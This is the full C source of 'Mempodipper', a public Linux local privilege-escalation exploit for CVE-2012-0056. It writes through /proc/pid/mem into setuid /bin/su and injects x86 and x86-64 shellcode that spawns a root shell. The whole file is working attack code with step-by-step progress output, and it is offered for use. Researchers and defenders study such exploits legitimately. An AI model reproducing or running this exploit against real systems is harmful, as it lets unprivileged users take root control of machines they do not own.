/*
Exploit code is here: http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c
Blog post about it is here: http://blog.zx2c4.com/749
*/

/*
 * Mempodipper
 * by zx2c4
 *
 * Linux Local Root Exploit
 *
 * Rather than put my write up here, per usual, this time I've put it
 * in a rather lengthy blog post: http://blog.zx2c4.com/749
 *
 * Enjoy.
 *
 * - zx2c4
 * Jan 21, 2012
 *
 * CVE-2012-0056
 */

#define _LARGEFILE64_SOURCE
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <sys/reg.h>
#include <fcntl.h>
#include <unistd.h>
#include <limits.h>

char *prog_name;

int send_fd(int sock, int fd)
{
	char buf[1];
	struct iovec iov;
	struct msghdr msg;
	struct cmsghdr *cmsg;
	int n;
	char cms[CMSG_SPACE(sizeof(int))];

	buf[0] = 0;
	iov.iov_base = buf;
	iov.iov_len = 1;

	memset(&msg, 0, sizeof msg);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = (caddr_t)cms;
	msg.msg_controllen = CMSG_LEN(sizeof(int));

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_len = CMSG_LEN(sizeof(int));
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	memmove(CMSG_DATA(cmsg), &fd, sizeof(int));

	if ((n = sendmsg(sock, &msg, 0)) != iov.iov_len)
		return -1;
	close(sock);
	return 0;
}

int recv_fd(int sock)
{
	int n;
	int fd;
	char buf[1];
	struct iovec iov;
	struct msghdr msg;
	struct cmsghdr *cmsg;
	char cms[CMSG_SPACE(sizeof(int))];

	iov.iov_base = buf;
	iov.iov_len = 1;

	memset(&msg, 0, sizeof msg);
	msg.msg_name = 0;
	msg.msg_namelen = 0;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	msg.msg_control = (caddr_t)cms;
	msg.msg_controllen = sizeof cms;

	if ((n = recvmsg(sock, &msg, 0)) < 0)
		return -1;
	if (n == 0)
		return -1;
	cmsg = CMSG_FIRSTHDR(&msg);
	memmove(&fd, CMSG_DATA(cmsg), sizeof(int));
	close(sock);
	return fd;
}

unsigned long ptrace_address()
{
	int fd[2];
	printf("[+] Creating ptrace pipe.\n");
	pipe(fd);
	fcntl(fd[0], F_SETFL, O_NONBLOCK);

	printf("[+] Forking ptrace child.\n");
	int child = fork();
	if (child) {
		close(fd[1]);
		char buf;
		printf("[+] Waiting for ptraced child to give output on syscalls.\n");
		for (;;) {
			wait(NULL);
			if (read(fd[0], &buf, 1) > 0)
				break;
			ptrace(PTRACE_SYSCALL, child, NULL, NULL);
		}

		printf("[+] Error message written. Single stepping to find address.\n");
		struct user_regs_struct regs;
		for (;;) {
			ptrace(PTRACE_SINGLESTEP, child, NULL, NULL);
			wait(NULL);
			ptrace(PTRACE_GETREGS, child, NULL, &regs);
#if defined(__i386__)
#define instruction_pointer regs.eip
#define upper_bound 0xb0000000
#elif defined(__x86_64__)
#define instruction_pointer regs.rip
#define upper_bound 0x700000000000
#else
#error "That platform is not supported."
#endif
			if (instruction_pointer < upper_bound) {
				unsigned long instruction = ptrace(PTRACE_PEEKTEXT, child, instruction_pointer, NULL);
				if ((instruction & 0xffff) == 0x25ff /* jmp r/m32 */)
					return instruction_pointer;
			}
		}
	} else {
		printf("[+] Ptrace_traceme'ing process.\n");
		if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0) {
			perror("[-] ptrace");
			return 0;
		}
		close(fd[0]);
		dup2(fd[1], 2);
		execl("/bin/su", "su", "not-a-valid-user", NULL);
	}
	return 0;
}

unsigned long objdump_address()
{
	FILE *command = popen("objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
	if (!command) {
		perror("[-] popen");
		return 0;
	}
	char result[32];
	fgets(result, 32, command);
	pclose(command);
	return strtoul(result, NULL, 16);
}

unsigned long find_address()
{
	printf("[+] Ptracing su to find next instruction without reading binary.\n");
	unsigned long address = ptrace_address();
	if (!address) {
		printf("[-] Ptrace failed.\n");
		printf("[+] Reading su binary with objdump to find exit@plt.\n");
		address = objdump_address();
		if (address == ULONG_MAX || !address) {
			printf("[-] Could not resolve /bin/su. Specify the exit@plt function address manually.\n");
			printf("[-] Usage: %s -o ADDRESS\n[-] Example: %s -o 0x402178\n", prog_name, prog_name);
			exit(-1);
		}
	}
	printf("[+] Resolved call address to 0x%lx.\n", address);
	return address;
}

int su_padding()
{
	printf("[+] Calculating su padding.\n");
	FILE *command = popen("/bin/su this-user-does-not-exist 2>&1", "r");
	if (!command) {
		perror("[-] popen");
		exit(1);
	}
	char result[256];
	fgets(result, 256, command);
	pclose(command);
	return strstr(result, "this-user-does-not-exist") - result;
}

int child(int sock)
{
	char parent_mem[256];
	sprintf(parent_mem, "/proc/%d/mem", getppid());
	printf("[+] Opening parent mem %s in child.\n", parent_mem);
	int fd = open(parent_mem, O_RDWR);
	if (fd < 0) {
		perror("[-] open");
		return 1;
	}
	printf("[+] Sending fd %d to parent.\n", fd);
	send_fd(sock, fd);
	return 0;
}

int parent(unsigned long address)
{
	int sockets[2];
	printf("[+] Opening socketpair.\n");
	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockets) < 0) {
		perror("[-] socketpair");
		return 1;
	}
	if (fork()) {
		printf("[+] Waiting for transferred fd in parent.\n");
		int fd = recv_fd(sockets[1]);
		printf("[+] Received fd at %d.\n", fd);
		if (fd < 0) {
			perror("[-] recv_fd");
			return 1;
		}
		printf("[+] Assigning fd %d to stderr.\n", fd);
		dup2(2, 15);
		dup2(fd, 2);

		unsigned long offset = address - su_padding();
		printf("[+] Seeking to offset 0x%lx.\n", offset);
		lseek64(fd, offset, SEEK_SET);

#if defined(__i386__)
		// See shellcode-32.s in this package for the source.
		char shellcode[] =
			"\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\x31\xc9\xb3"
			"\x0f\xb1\x02\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68"
			"\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\x66\xba\x2d\x69\x52\x89"
			"\xe0\x31\xd2\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd"
			"\x80";
#elif defined(__x86_64__)
		// See shellcode-64.s in this package for the source.
		char shellcode[] =
			"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xff\xb0\x6a\x0f\x05\x48"
			"\x31\xf6\x40\xb7\x0f\x40\xb6\x02\xb0\x21\x0f\x05\x48\xbb\x2f"
			"\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7"
			"\x48\x31\xdb\x66\xbb\x2d\x69\x53\x48\x89\xe1\x48\x31\xc0\x50"
			"\x51\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05";
#else
#error "That platform is not supported."
#endif
		printf("[+] Executing su with shellcode.\n");
		execl("/bin/su", "su", shellcode, NULL);
	} else {
		char sock[32];
		sprintf(sock, "%d", sockets[0]);
		printf("[+] Executing child from child fork.\n");
		execl("/proc/self/exe", prog_name, "-c", sock, NULL);
	}
	return 0;
}

int main(int argc, char **argv)
{
	prog_name = argv[0];

	if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'c')
		return child(atoi(argv[2]));

	printf("===============================\n");
	printf("=          Mempodipper        =\n");
	printf("=           by zx2c4          =\n");
	printf("=         Jan 21, 2012        =\n");
	printf("===============================\n\n");

	if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'o')
		return parent(strtoul(argv[2], NULL, 16));
	else
		return parent(find_address());

}